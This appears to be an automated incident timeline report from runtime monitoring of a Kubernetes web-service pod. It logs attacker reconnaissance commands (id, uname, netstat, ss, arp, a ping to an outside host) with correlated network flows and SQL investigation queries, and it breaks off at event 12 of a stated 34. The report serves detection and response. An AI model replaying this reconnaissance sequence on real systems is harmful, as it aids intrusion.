# Automated Incident Timeline Report
> **Generated:** 2026-01-31 02:33:38
> **Total Events:** 34

## 1. [CORRELATED] 08:50:15.649733 - 08:50:16.328451
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgyMTkyMTMxNTc2ODQ6OTQyODk2`

**Command (x17):**
```bash
/bin/sh -c id
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:50:07.071000 - 08:52:04.380000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 292 | RELATED |
| 08:50:48.169000 - 08:51:29.534000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 8 | RELATED |
| 08:50:16.324000 - 08:52:04.380000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57848 | 7 | RELATED |
| 08:51:42.332000 - 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 6 | RELATED |
| 08:50:15.941000 - 08:51:15.955000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57796 | 5 | RELATED |
| 08:50:15.630000 - 08:50:15.719000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57714 | 3 | RELATED |
| 08:50:15.719000 - 08:50:15.740000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57718 | 3 | RELATED |
| 08:50:15.804000 - 08:50:15.994000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57750 | 3 | RELATED |
| 08:50:15.844000 - 08:50:15.858000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57762 | 3 | RELATED |
| 08:50:15.861000 - 08:50:15.872000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57770 | 3 | RELATED |

<details><summary>View 20 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:50:15.887000 - 08:50:15.909000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57786 | 3 | RELATED |
| 08:50:15.998000 - 08:50:16.018000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57804 | 3 | RELATED |
| 08:50:16.026000 - 08:50:16.036000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57812 | 3 | RELATED |
| 08:50:16.113000 - 08:50:16.168000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57826 | 3 | RELATED |
| 08:50:15.785000 - 08:50:15.799000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57734 | 2 | RELATED |
| 08:50:16.177000 - 08:50:16.191000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57828 | 2 | RELATED |
| 08:50:16.223000 - 08:50:16.236000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57838 | 2 | RELATED |
| 08:50:07.070000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34378 | 1 | RELATED |
| 08:50:15.665000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:1269 | 1 | RELATED |
| 08:50:15.815000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:52376 | 1 | RELATED |
| 08:50:15.953000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:12039 | 1 | RELATED |
| 08:50:16.127000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:26104 | 1 | RELATED |
| 08:50:16.335000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:5495 | 1 | RELATED |
| 08:50:50.180000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:10124 | 1 | RELATED |
| 08:51:04.374000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:54195 | 1 | RELATED |
| 08:51:14.079000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:6519 | 1 | RELATED |
| 08:51:42.342000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:14939 | 1 | RELATED |
| 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:25563 | 1 | RELATED |
| 08:50:48.176000 - 08:50:48.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:0 | 2 | RELATED |
| 08:50:48.177000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:0 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgyMTkyMTMxNTc2ODQ6OTQyODk2';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:48:15.649733' AND '2026-01-30 08:52:16.328451' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 2. [CONFIRMED] 08:50:48.176085
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgyNTE3NDEyMTczNjM6OTQyOTQ1`

**Command (x1):**
```bash
/bin/sh -c "ping -c 3 172.30.164.116"
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:50:48.176000 - 08:50:48.177000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:0** | 2 | CONFIRMED |
| 08:50:48.177000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:0** | 1 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgyNTE3NDEyMTczNjM6OTQyOTQ1';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:48:48.176085' AND '2026-01-30 08:52:48.176085' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---
## 3. [CORRELATED] 08:51:04.369948
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgyNjc5MzUwODAzNTk6OTQyOTYw`

**Command (x1):**
```bash
/bin/sh -c "uname -a"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:51:04.361000 - 08:53:03.907000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 164 | RELATED |
| 08:52:25.678000 - 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 12 | RELATED |
| 08:51:42.332000 - 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 7 | RELATED |
| 08:51:14.072000 - 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 5 | RELATED |
| 08:51:04.373000 - 08:52:04.380000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57848 | 3 | RELATED |
| 08:51:04.374000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:54195 | 1 | RELATED |
| 08:51:14.079000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:6519 | 1 | RELATED |
| 08:51:15.955000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57796 | 1 | RELATED |
| 08:51:42.342000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:14939 | 1 | RELATED |
| 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:25563 | 1 | RELATED |

<details><summary>View 4 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgyNjc5MzUwODAzNTk6OTQyOTYw';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:49:04.369948' AND '2026-01-30 08:53:04.369948' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 4. [CORRELATED] 08:51:04.370450
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgyNjc5MzU1ODI0NTI6OTQyOTYw`

**Command (x1):**
```bash
/bin/uname -a
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:51:04.361000 - 08:53:03.907000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 164 | RELATED |
| 08:52:25.678000 - 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 12 | RELATED |
| 08:51:42.332000 - 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 7 | RELATED |
| 08:51:14.072000 - 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 5 | RELATED |
| 08:51:04.373000 - 08:52:04.380000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57848 | 3 | RELATED |
| 08:51:04.374000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:54195 | 1 | RELATED |
| 08:51:14.079000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:6519 | 1 | RELATED |
| 08:51:15.955000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57796 | 1 | RELATED |
| 08:51:42.342000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:14939 | 1 | RELATED |
| 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:25563 | 1 | RELATED |

<details><summary>View 4 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgyNjc5MzU1ODI0NTI6OTQyOTYw';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:49:04.370450' AND '2026-01-30 08:53:04.370450' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 5. [CORRELATED] 08:51:14.076623
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgyNzc2NDE3NTU3NzI6OTQyOTcx`

**Command (x1):**
```bash
/bin/sh -c "cat /etc/os-release"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:51:04.361000 - 08:53:03.907000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 164 | RELATED |
| 08:52:25.678000 - 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 12 | RELATED |
| 08:51:42.332000 - 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 7 | RELATED |
| 08:51:14.072000 - 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 5 | RELATED |
| 08:51:04.373000 - 08:52:04.380000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57848 | 3 | RELATED |
| 08:51:04.374000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:54195 | 1 | RELATED |
| 08:51:14.079000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:6519 | 1 | RELATED |
| 08:51:15.955000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57796 | 1 | RELATED |
| 08:51:42.342000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:14939 | 1 | RELATED |
| 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:25563 | 1 | RELATED |

<details><summary>View 4 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgyNzc2NDE3NTU3NzI6OTQyOTcx';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:49:14.076623' AND '2026-01-30 08:53:14.076623' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 6. [CORRELATED] 08:51:29.530364
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgyOTMwODg0NTgyMjY6OTQyOTkw`

**Command (x1):**
```bash
/bin/sh -c "cat /proc/cpuinfo"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:51:29.524000 - 08:53:03.907000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 132 | RELATED |
| 08:52:25.678000 - 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 12 | RELATED |
| 08:51:42.332000 - 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 7 | RELATED |
| 08:51:29.534000 - 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 3 | RELATED |
| 08:51:42.342000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:14939 | 1 | RELATED |
| 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:25563 | 1 | RELATED |
| 08:52:04.380000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57848 | 1 | RELATED |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |

<details><summary>View 1 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgyOTMwODg0NTgyMjY6OTQyOTkw';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:49:29.530364' AND '2026-01-30 08:53:29.530364' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 7. [CORRELATED] 08:51:42.336908
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgzMDU4OTUwMDA5NTk6OTQyOTk5`

**Command (x1):**
```bash
/bin/sh -c "free -h"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:51:42.330000 - 08:53:36.717000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 146 | RELATED |
| 08:52:25.678000 - 08:53:36.716000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 14 | RELATED |
| 08:51:42.332000 - 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 7 | RELATED |
| 08:53:29.917000 - 08:53:29.923000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 4 | RELATED |
| 08:51:42.342000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:14939 | 1 | RELATED |
| 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:25563 | 1 | RELATED |
| 08:52:04.380000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57848 | 1 | RELATED |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |

<details><summary>View 4 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgzMDU4OTUwMDA5NTk6OTQyOTk5';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:49:42.336908' AND '2026-01-30 08:53:42.336908' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 8. [CORRELATED] 08:51:56.174816
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgzMTk3MzI5MDkxMTA6OTQzMDE0`

**Command (x1):**
```bash
/bin/sh -c "ip addr"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:51:56.165000 - 08:53:36.717000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 128 | RELATED |
| 08:52:25.678000 - 08:53:36.716000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 14 | RELATED |
| 08:53:29.917000 - 08:53:29.923000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 4 | RELATED |
| 08:51:56.178000 - 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 3 | RELATED |
| 08:51:56.178000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:25563 | 1 | RELATED |
| 08:52:04.380000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:57848 | 1 | RELATED |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |

<details><summary>View 3 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgzMTk3MzI5MDkxMTA6OTQzMDE0';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:49:56.174816' AND '2026-01-30 08:53:56.174816' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 9. [CORRELATED] 08:52:25.682864
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgzNDkyNDY1MzAyNDY6OTQzMDQ1`

**Command (x1):**
```bash
/bin/sh -c "netstat -tulpn"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:25.676000 - 08:54:10.768000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 122 | RELATED |
| 08:52:25.678000 - 08:53:36.716000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 14 | RELATED |
| 08:54:10.768000 - 08:54:22.188000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 10 | RELATED |
| 08:53:29.917000 - 08:54:10.766000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 6 | RELATED |
| 08:54:10.769000 - 08:54:22.188000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 4 | RELATED |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |

<details><summary>View 4 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |
| 08:54:10.767000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64731 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgzNDkyNDY1MzAyNDY6OTQzMDQ1';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:50:25.682864' AND '2026-01-30 08:54:25.682864' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 10. [CORRELATED] 08:52:35.644949
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgzNTkyMDg2MTQwMTA6OTQzMDU0`

**Command (x1):**
```bash
/bin/sh -c "ss -antp"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:25.676000 - 08:54:10.768000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 122 | RELATED |
| 08:52:25.678000 - 08:53:36.716000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 14 | RELATED |
| 08:54:10.768000 - 08:54:35.336000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 14 | RELATED |
| 08:54:10.769000 - 08:54:35.335000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 8 | RELATED |
| 08:53:29.917000 - 08:54:10.766000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 6 | RELATED |
| 08:52:25.688000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:37679 | 1 | RELATED |
| 08:52:29.533000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:34094 | 1 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |

<details><summary>View 4 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |
| 08:54:10.767000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64731 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgzNTkyMDg2MTQwMTA6OTQzMDU0';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:50:35.644949' AND '2026-01-30 08:54:35.644949' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 11. [CORRELATED] 08:52:43.392102
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgzNjY5NTU3Njc0MjU6OTQzMDU5`

**Command (x1):**
```bash
/bin/sh -c "arp -a"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:35.638000 - 08:54:36.707000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 102 | RELATED |
| 08:54:10.768000 - 08:54:35.336000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 14 | RELATED |
| 08:52:35.649000 - 08:54:36.707000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 11 | RELATED |
| 08:54:10.769000 - 08:54:35.335000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 8 | RELATED |
| 08:53:29.917000 - 08:54:10.766000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 6 | RELATED |
| 08:52:43.398000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64621 | 1 | RELATED |
| 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |

<details><summary>View 2 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |
| 08:54:10.767000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64731 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgzNjY5NTU3Njc0MjU6OTQzMDU5';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:50:43.392102' AND '2026-01-30 08:54:43.392102' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 12. [CORRELATED] 08:52:56.780194
